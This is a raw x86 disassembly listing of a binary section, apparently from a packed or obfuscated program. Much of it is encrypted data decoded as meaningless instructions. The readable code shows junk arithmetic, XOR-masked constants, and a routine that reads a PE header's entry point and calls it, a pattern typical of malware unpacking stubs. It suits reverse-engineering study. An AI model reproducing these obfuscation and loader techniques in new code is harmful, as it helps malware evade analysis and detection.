  4060bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060c0:	shl    bl,0xd6
  4060c3:	outs   dx,DWORD PTR ds:[esi]
  4060c4:	ins    BYTE PTR es:[edi],dx
  4060c5:	sahf   
  4060c6:	jg     0x406138
  4060c8:	ins    BYTE PTR es:[edi],dx
  4060c9:	or     BYTE PTR [ecx-0x26cdf1e],dh
  4060cf:	and    eax,0xbb35f3cf
  4060d4:	loop   0x406154
  4060d6:	scas   al,BYTE PTR es:[edi]
  4060d7:	int3   
  4060d8:	mov    ch,0x2d
  4060da:	mov    DWORD PTR [eax+edi*8],esp
  4060dd:	loope  0x406140
  4060df:	mov    WORD PTR [ebp+0x63],?
  4060e2:	inc    eax
  4060e3:	dec    edi
  4060e4:	mov    ds:0x836144d7,al
  4060e9:	imul   BYTE PTR [edx]
  4060eb:	mov    edx,0xe82d57cb
  4060f0:	or     DWORD PTR [ebx],edi
  4060f2:	dec    ebp
  4060f3:	lds    edi,FWORD PTR [ecx-0x43]
  4060f6:	lods   eax,DWORD PTR ds:[esi]
  4060f7:	mov    BYTE PTR [esi-0x7],bh
  4060fa:	or     cl,dh
  4060fc:	shl    DWORD PTR [eax+0x6f619a8b],cl
  406102:	retf   
  406103:	popa   
  406104:	sbb    al,BYTE PTR [esi]
  406106:	(bad)  
  406107:	mov    dl,0x14
  406109:	xchg   esp,eax
  40610a:	in     al,dx
  40610b:	imul   esi,ebx,0x483075c3
  406111:	out    dx,eax
  406112:	inc    ebp
  406113:	les    esi,FWORD PTR [edi]
  406115:	sbb    eax,0x64c77db8
  40611a:	and    al,0xe8
  40611c:	cdq    
  40611d:	fisubr DWORD PTR [edx]
  40611f:	xor    ebx,edx
  406121:	pop    esp
  406122:	hlt    
  406123:	jl     0x40613c
  406125:	sbb    DWORD PTR [ecx+ebp*4],edx
  406128:	push   ss
  406129:	inc    esi
  40612a:	call   0x4818:0x20e4e99e
  406131:	lds    edx,FWORD PTR [eax]
  406133:	xor    al,0x73
  406135:	pop    es
  406136:	cmp    ebp,edx
  406138:	cwde   
  406139:	mov    edi,0xe284c44f
  40613e:	fbld   TBYTE PTR [ebx]
  406140:	dec    ecx
  406141:	jle    0x4061a2
  406143:	cmp    ch,BYTE PTR [ebp+0x482b02f]
  406149:	mov    ds:0xfd75be18,eax
  40614e:	mov    cl,0x9c
  406150:	mov    BYTE PTR [esi],0x79
  406153:	cli    
  406154:	out    0xda,eax
  406156:	ins    BYTE PTR es:[edi],dx
  406157:	mov    DWORD PTR [esi-0x1d43d7d9],ebp
  40615d:	push   es
  40615e:	or     al,BYTE PTR [edx]
  406160:	mov    al,ds:0xb392664
  406165:	pop    ss
  406166:	es jmp 0x4061de
  406169:	xchg   DWORD PTR [eax+esi*2],esi
  40616c:	out    dx,al
  40616d:	xor    al,0xf9
  40616f:	push   ds
  406170:	add    BYTE PTR [edi+0x250f2000],0x41
  406177:	test   DWORD PTR [edi-0x4ad09443],0x4a1eeaf3
  406181:	push   eax
  406182:	jmp    0xd7ac4d90
  406187:	in     eax,dx
  406188:	mov    bh,0x48
  40618a:	mov    dl,BYTE PTR [esi-0x7d33e8d1]
  406190:	jmp    0x4061bc
  406192:	mov    gs,WORD PTR [edi]
  406194:	mov    esp,0xbb96b359
  406199:	cmp    BYTE PTR [eax],cl
  40619b:	dec    eax
  40619c:	js     0x40618e
  40619e:	arpl   WORD PTR [esi],bp
  4061a0:	sub    DWORD PTR [edx+0x1f48100b],0xffffff8b
  4061a7:	cs lods eax,DWORD PTR ss:[esi]
  4061aa:	cmp    al,0xe2
  4061ac:	inc    ecx
  4061ad:	sbb    bl,bh
  4061af:	cmp    eax,0xc53690cf
  4061b4:	das    
  4061b5:	out    dx,eax
  4061b6:	mov    ds:0x56881acb,al
  4061bb:	imul   edx,DWORD PTR [ebp+0x4d],0x12
  4061bf:	mov    BYTE PTR [esi+0x7c0a6560],0x2e
  4061c6:	out    dx,eax
  4061c7:	xor    esi,DWORD PTR [eax+0x43]
  4061ca:	(bad)  
  4061cb:	data16 add BYTE PTR [ebx+0x5a7e2859],al
  4061d2:	ficomp WORD PTR [ecx+0x7edf7fdd]
  4061d8:	jne    0x4061c0
  4061da:	stc    
  4061db:	retf   0x5dcd
  4061de:	pop    ebx
  4061df:	jbe    0x4061b9
  4061e1:	ss ss leave 
  4061e4:	adc    BYTE PTR [edi-0x270d045a],dl
  4061ea:	cwde   
  4061eb:	mov    eax,ds:0xe493a957
  4061f0:	(bad)  
  4061f1:	mov    eax,0x2d1fffd7
  4061f6:	lahf   
  4061f7:	sahf   
  4061f8:	mov    ch,0x14
  4061fa:	nop
  4061fb:	cld    
  4061fc:	pop    ebx
  4061fd:	not    BYTE PTR [ecx+esi*1]
  406200:	out    dx,eax
  406201:	sub    DWORD PTR [ecx-0x504013a5],edi
  406207:	mov    WORD PTR [ebp-0x3],?
  40620a:	jne    0x4061fa
  40620c:	add    DWORD PTR [edx+eax*8-0x50164e44],edi
  406213:	pop    esp
  406214:	or     al,0xf3
  406216:	xor    eax,0x242d6fc8
  40621b:	jl     0x40621c
  40621d:	lods   al,BYTE PTR ds:[esi]
  40621e:	mov    esi,0x3a8905fd
  406223:	inc    edi
  406224:	stos   BYTE PTR es:[edi],al
  406225:	cmp    BYTE PTR [edi],dh
  406227:	or     cl,al
  406229:	xchg   esi,eax
  40622a:	or     ebx,DWORD PTR [ebx+0x2b]
  40622d:	shr    DWORD PTR [edi+0x26],cl
  406230:	sbb    dl,bh
  406232:	cs inc ecx
  406234:	aaa    
  406235:	imul   DWORD PTR [edx]
  406237:	adc    edx,DWORD PTR [edi+0x74]
  40623a:	retf   
  40623b:	cld    
  40623c:	out    0x31,al
  40623e:	sub    al,0x96
  406240:	aam    0xb2
  406242:	mov    ebx,esi
  406244:	fucomip st,st(5)
  406246:	outs   dx,BYTE PTR ds:[esi]
  406247:	sar    DWORD PTR [esi+0x3c],0xa2
  40624b:	les    ebp,FWORD PTR [edx]
  40624d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40624e:	add    eax,DWORD PTR [ecx+0x3b]
  406251:	sub    bh,bh
  406253:	fcomp  QWORD PTR [eax-0x4a4ecd2d]
  406259:	hlt    
  40625a:	pop    esi
  40625b:	xor    DWORD PTR [esi+ebx*8+0x25360952],edi
  406262:	repnz mov ebp,0x2581f033
  406268:	mov    ds:0x4338,eax
  40626d:	add    BYTE PTR [eax],al
  40626f:	add    cl,ch
  406271:	or     eax,0x8b000000
  406276:	or     eax,0x4338a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	sub    eax,DWORD PTR [eax]
  406313:	jb     0x40632f
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	push   ds
  40631e:	(bad)  
  40631f:	cli    
  406320:	mov    dh,0x44
  406322:	mov    eax,0x4aa4c46a
  406327:	jmp    DWORD PTR [ecx]
  406329:	add    eax,0xe884db57
  40632e:	inc    esp
  40632f:	lock push ds
  406331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406332:	pop    eax
  406333:	ja     0x40636c
  406335:	mov    eax,cs
  406337:	mov    DWORD PTR [esi],0x307d0984
  40633d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40633e:	mov    ebp,0x22693870
  406343:	mov    ah,0x55
  406345:	sbb    ch,BYTE PTR [eax+0x4952a3d9]
  40634b:	mov    eax,0x7f0b6fe4
  406350:	bound  eax,QWORD PTR [esi-0x3e418e0]
  406356:	jne    0x4063d4
  406358:	and    al,0x6b
  40635a:	test   eax,0xe005f4cb
  40635f:	retf   
  406360:	mov    esp,eax
  406362:	xchg   DWORD PTR [edi+0x3a],esi
  406365:	mov    ecx,0x281f3006
  40636a:	cmp    eax,0xbdda925b
  40636f:	arpl   WORD PTR [edx],di
  406371:	adc    eax,0x34372f77
  406376:	mov    edx,0x3b0964c
  40637b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40637c:	std    
  40637d:	out    dx,eax
  40637e:	into   
  40637f:	out    0x9a,al
  406381:	mov    ebp,0x3a23bf20
  406386:	mov    esp,0xcc27379c
  40638b:	sub    eax,0x871f4f1e
  406390:	aaa    
  406391:	aam    0x45
  406393:	xchg   ecx,eax
  406394:	mov    dl,0xd5
  406396:	aad    0xcb
  406398:	push   ebx
  406399:	or     bh,BYTE PTR [ebx+0x2a151aaf]
  40639f:	and    eax,0xf0519f8b
  4063a4:	scas   al,BYTE PTR es:[edi]
  4063a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063a6:	jge    0x4063e9
  4063a8:	repnz or eax,0xa40c1b99
  4063ae:	xchg   edi,eax
  4063af:	hlt    
  4063b0:	dec    edi
  4063b1:	into   
  4063b2:	sti    
  4063b3:	fldenv [edi-0x5abd623a]
  4063b9:	fwait
  4063ba:	imul   esi,DWORD PTR [ecx],0xffffff9e
  4063bd:	or     DWORD PTR [edx-0x2f1669d0],ebp
  4063c3:	sub    dl,BYTE PTR ds:0x27db1fb2
  4063c9:	jge    0x40643a
  4063cb:	retf   
  4063cc:	inc    esi
  4063cd:	mov    esi,0x9f760818
  4063d2:	rol    cl,0xe0
  4063d5:	or     ch,ah
  4063d7:	sub    al,0x36
  4063d9:	xor    bl,dh
  4063db:	sar    DWORD PTR [ecx+0x35],1
  4063de:	out    dx,al
  4063df:	xchg   ebx,eax
  4063e0:	push   eax
  4063e1:	jecxz  0x4063bf
  4063e3:	cmp    eax,0xbd208efb
  4063e8:	mov    BYTE PTR [ebx+0xea7b265],dl
  4063ee:	xor    DWORD PTR [eax],eax
  4063f0:	int3   
  4063f1:	bound  ebx,QWORD PTR [esi-0x74]
  4063f4:	add    al,0x39
  4063f6:	ret    0x4832
  4063f9:	mov    ds:0xdb680f11,eax
  4063fe:	in     eax,dx
  4063ff:	mul    DWORD PTR [ebx]
  406401:	int3   
  406402:	adc    BYTE PTR [eax+edx*1],ch
  406405:	hlt    
  406406:	mov    edi,0x6d4672b5
  40640b:	pop    ecx
  40640c:	push   ebx
  40640d:	lock loopne 0x4063b4
  406410:	mov    WORD PTR [eax],?
  406412:	fist   DWORD PTR [eax+0x58]
  406415:	jle    0x4063ff
  406417:	adc    BYTE PTR [eax],bl
  406419:	mov    DWORD PTR [edi+eiz*8],edx
  40641c:	(bad)  
  40641d:	mov    dl,0xc
  40641f:	arpl   WORD PTR [ebx+0x5ec8218e],di
  406425:	iret   
  406426:	js     0x406413
  406428:	jp     0x406432
  40642a:	mov    DWORD PTR [edx+edx*4-0x2a],eax
  40642e:	jae    0x40641e
  406430:	(bad)  
  406432:	mov    ebx,0xfa5b806e
  406437:	ret    0xcd94
  40643a:	mov    eax,0x85f7e6c4
  40643f:	test   BYTE PTR [edx],dl
  406441:	mov    ebx,edi
  406443:	(bad)  
  406445:	cs pop edx
  406447:	imul   ebx,DWORD PTR [ebx],0x28
  40644a:	aad    0xd9
  40644c:	scas   eax,DWORD PTR es:[edi]
  40644d:	ss loop 0x40643f
  406450:	inc    ebp
  406451:	mov    eax,ds:0xf78459b
  406456:	push   edx
  406457:	bound  ebx,QWORD PTR [eax+0x3cc9265f]
  40645d:	inc    edi
  40645e:	add    al,0x2a
  406460:	ss sbb al,ch
  406463:	js     0x40643a
  406465:	push   ebp
  406466:	mov    DWORD PTR [eax+edi*8+0x689b6937],ebx
  40646d:	rcl    ecx,1
  40646f:	push   0xffffffdd
  406471:	xchg   edi,eax
  406472:	out    dx,al
  406473:	call   0x9664a4df
  406478:	sti    
  406479:	js     0x40645e
  40647b:	mov    ah,ah
  40647d:	push   esi
  40647e:	sub    eax,0x951b60a0
  406483:	xor    ch,BYTE PTR [ecx+ebp*8]
  406486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406488:	lock sub dh,bl
  40648b:	mov    eax,DWORD PTR [edi]
  40648d:	lods   eax,DWORD PTR ds:[esi]
  40648e:	or     DWORD PTR [edx],eax
  406490:	jmp    0x56b6fe50
  406495:	or     bh,dh
  406497:	xchg   DWORD PTR [ebp+esi*1+0x64b24e7e],eax
  40649e:	cmp    al,0x91
  4064a0:	add    edi,DWORD PTR [ecx-0x6ee020e3]
  4064a6:	pop    ss
  4064a7:	or     DWORD PTR [ebx-0x4e05d20b],esp
  4064ad:	mov    ebx,0xf1c6c587
  4064b2:	mov    al,ds:0x8a271161
  4064b7:	or     BYTE PTR [ebx+0x1f316326],cl
  4064bd:	fcomip st,st(1)
  4064bf:	jnp    0x4064f2
  4064c1:	clc    
  4064c2:	jg     0x4064e4
  4064c4:	mov    ?,WORD PTR [ecx+eax*8]
  4064c7:	mov    ch,0x28
  4064c9:	nop
  4064ca:	hlt    
  4064cb:	add    esp,DWORD PTR [esi]
  4064cd:	or     al,0xb2
  4064cf:	or     BYTE PTR [edx-0x547b5d19],ah
  4064d5:	retf   0x91a8
  4064d8:	dec    edi
  4064d9:	(bad)  
  4064da:	in     eax,dx
  4064db:	cmp    eax,0x3f8154db
  4064e0:	fcomp  DWORD PTR [ebx-0x63b86fe1]
  4064e6:	mov    al,0x72
  4064e8:	dec    esi
  4064e9:	rol    BYTE PTR [ebx+0xd4b10b7],0x24
  4064f0:	dec    ecx
  4064f1:	jl     0x40654a
  4064f3:	es sub eax,0xdc09ec04
  4064f9:	or     BYTE PTR [esi+0x4f],dl
  4064fc:	fwait
  4064fd:	mov    esi,0x2eb9f712
  406502:	sub    DWORD PTR [esi+esi*4-0x6eb55ca6],esp
  406509:	pop    es
  40650a:	jl     0x40655b
  40650c:	mov    ds:0x8605ea5f,eax
  406511:	in     al,dx
  406512:	lds    ecx,FWORD PTR [ebx]
  406514:	inc    DWORD PTR [ebx]
  406516:	fidiv  DWORD PTR [ebx-0x5f]
  406519:	sbb    al,BYTE PTR [ecx-0x44]
  40651c:	icebp  
  40651d:	adc    al,0xda
  40651f:	adc    DWORD PTR [edx-0x3c],edx
  406522:	pop    edi
  406523:	jg     0x4064cd
  406525:	arpl   WORD PTR [edi-0x6a],cx
  406528:	or     BYTE PTR [edi+0x48],bh
  40652b:	mov    ecx,DWORD PTR [esi]
  40652d:	adc    esp,ebx
  40652f:	push   es
  406530:	sub    ah,BYTE PTR [esi-0x28]
  406533:	push   eax
  406534:	sahf   
  406535:	icebp  
  406536:	retf   0xbc00
  406539:	or     eax,0xb0bd42d1
  40653e:	sub    dh,BYTE PTR [eax+0x3bf07188]
  406544:	iret   
  406545:	sbb    DWORD PTR [edx+0x43b4bee9],edx
  40654b:	popf   
  40654c:	(bad)  
  40654d:	(bad)  
  40654e:	pop    ss
  40654f:	push   esp
  406550:	mov    ch,0xf
  406552:	xchg   ebp,eax
  406553:	out    0xef,eax
  406555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406556:	dec    ecx
  406557:	cmp    esi,ebp
  406559:	test   al,0xc8
  40655b:	fbstp  TBYTE PTR [ecx-0x7eb67a47]
  406561:	xchg   ebx,eax
  406562:	dec    eax
  406563:	cmp    al,0x5f
  406565:	(bad)  
  406566:	jmp    0xf75d:0x39c5ffad
  40656d:	adc    DWORD PTR [ebp+0x1d],0xf2ec1bfe
  406574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406575:	jns    0x406569
  406577:	sbb    BYTE PTR ds:0xc83ab18a,dh
  40657d:	xchg   ebp,eax
  40657e:	dec    esp
  40657f:	and    DWORD PTR gs:[ecx],esp
  406582:	or     cl,BYTE PTR [esi-0x44]
  406585:	push   ecx
  406586:	rcl    BYTE PTR ds:0x5cbbdd2f,1
  40658c:	cs xchg ebp,eax
  40658e:	mov    ah,0xec
  406590:	fbld   TBYTE PTR [esi-0x46]
  406593:	add    bl,BYTE PTR [edi-0x44]
  406596:	ins    BYTE PTR es:[edi],dx
  406597:	xor    BYTE PTR [eax],ah
  406599:	mov    bh,0xf0
  40659b:	nop
  40659c:	push   ss
  40659d:	inc    esp
  40659e:	loope  0x4065eb
  4065a0:	fld    DWORD PTR [esp+eax*2]
  4065a3:	retf   
  4065a4:	jnp    0x40653a
  4065a6:	sub    edx,DWORD PTR [ebp-0x72c8d750]
  4065ac:	or     ebp,esi
  4065ae:	adc    DWORD PTR [ebx],ebp
  4065b0:	xchg   edi,eax
  4065b1:	in     eax,dx
  4065b2:	mov    ebp,0x1c82d123
  4065b7:	fwait
  4065b8:	inc    ebp
  4065b9:	mov    al,ds:0x25975dd
  4065be:	jp     0x40663b
  4065c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065c1:	adc    eax,0x92252aed
  4065c6:	fptan  
  4065c8:	loope  0x406597
  4065ca:	jge    0x406564
  4065cc:	(bad)  
  4065cd:	imul   al
  4065cf:	jb     0x4065cc
  4065d1:	jns    0x406617
  4065d3:	sti    
  4065d4:	je     0x406619
  4065d6:	adc    dl,al
  4065d8:	xchg   DWORD PTR [ecx+0x41],esp
  4065db:	pop    ebx
  4065dc:	jo     0x4065c9
  4065de:	loop   0x4065fb
  4065e0:	fild   WORD PTR [eax+0x59]
  4065e3:	xchg   esi,eax
  4065e4:	retf   
  4065e5:	jbe    0x4065f5
  4065e7:	mov    esi,0xf1bcb84b
  4065ec:	or     bl,dl
  4065ee:	jle    0x40662f
  4065f0:	mov    edi,0x4d782f1e
  4065f5:	jg     0x406644
  4065f7:	je     0x406624
  4065f9:	cwde   
  4065fa:	jmp    0xae85:0x39959db9
  406601:	push   cs
  406602:	xchg   DWORD PTR [eax],esi
  406604:	ins    BYTE PTR es:[edi],dx
  406605:	add    ebp,0x28
  406608:	or     esp,eax
  40660a:	jle    0x406640
  40660c:	sub    bl,BYTE PTR [esi]
  40660e:	in     eax,0x27
  406610:	ss xchg dl,dl
  406613:	mov    ecx,0x9b9c2d66
  406618:	pusha  
  406619:	into   
  40661a:	mov    BYTE PTR es:[ecx+0xbe47ded],dh
  406621:	inc    edx
  406622:	ds ret 
  406624:	out    dx,al
  406625:	sbb    BYTE PTR [edi-0x49],dh
  406628:	mov    DWORD PTR [ecx],ecx
  40662a:	fisubr WORD PTR [ecx+eiz*2-0x33]
  40662e:	outs   dx,BYTE PTR ds:[esi]
  40662f:	ret    0xaec0
  406632:	iret   
  406633:	mov    ebx,0xfc593337
  406638:	adc    eax,0x9300054e
  40663d:	lea    ecx,[edx]
  40663f:	in     al,dx
  406640:	pop    esp
  406641:	loope  0x40667f
  406643:	xchg   edi,edi
  406645:	pushf  
  406646:	shr    DWORD PTR [ecx],1
  406648:	aas    
  406649:	into   
  40664a:	(bad)  
  40664b:	repnz dec ebp
  40664d:	or     eax,ebx
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
